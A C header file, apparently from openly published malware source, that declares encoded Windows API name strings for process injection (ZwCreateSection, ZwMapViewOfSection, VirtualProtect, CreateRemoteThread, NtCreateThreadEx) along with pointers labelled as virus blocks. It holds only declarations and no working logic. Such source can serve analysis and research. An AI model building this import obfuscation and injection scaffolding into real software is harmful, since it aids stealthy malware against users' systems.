/******************************************************************************************
  Copyright 2012-2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#ifndef __DATA_H__
#define __DATA_H__

#include "define.h"

#pragma pack(push)
#pragma pack(4)

const WCHAR ENCODED_KERNEL32_DLL_ASLR__08x[23];

const char ENCODED_lstrcmpiW[20];
const char ENCODED_VirtualQuery[26];
const char ENCODED_VirtualProtect[30];
const char ENCODED_GetProcAddress[30];
const char ENCODED_MapViewOfFile[28];
const char ENCODED_UnmapViewOfFile[32];
const char ENCODED_FlushInstructionCache[44];
const char ENCODED_LoadLibraryW[26];
const char ENCODED_FreeLibrary[24];
const char ENCODED_ZwCreateSection[32];
const char ENCODED_ZwMapViewOfSection[38];
const char ENCODED_CreateThread[26];
const char ENCODED_WaitForSingleObject[40];
const char ENCODED_GetExitCodeThread[36];
const char ENCODED_ZwClose[16];
const char ENCODED_CreateRemoteThread[38];
const char ENCODED_NtCreateThreadEx[34];

const WCHAR ENCODED_KERNEL32_DLL[13];
const WCHAR ENCODED_NTDLL_DLL[10];

#pragma pack(pop)

//const char szEncryptedSectionMark[5];

static BOOL bSetup;

static PVOID s_ASMCodeBlocksPTR;
static PVOID s_virusBlocksPTR;
static PVOID s_codeBlockPTR;

static HINSTANCE hINSTANCE;

#endif